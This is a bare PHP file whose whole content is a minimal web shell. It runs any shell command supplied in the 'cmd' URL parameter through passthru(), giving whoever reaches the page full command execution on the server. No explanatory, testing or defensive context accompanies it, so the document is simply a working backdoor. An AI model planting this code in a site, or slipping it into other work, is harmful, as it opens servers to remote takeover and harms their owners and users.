<?php
  if(isset($_GET['cmd'])) {
    passthru($_GET['cmd']);
  }
?>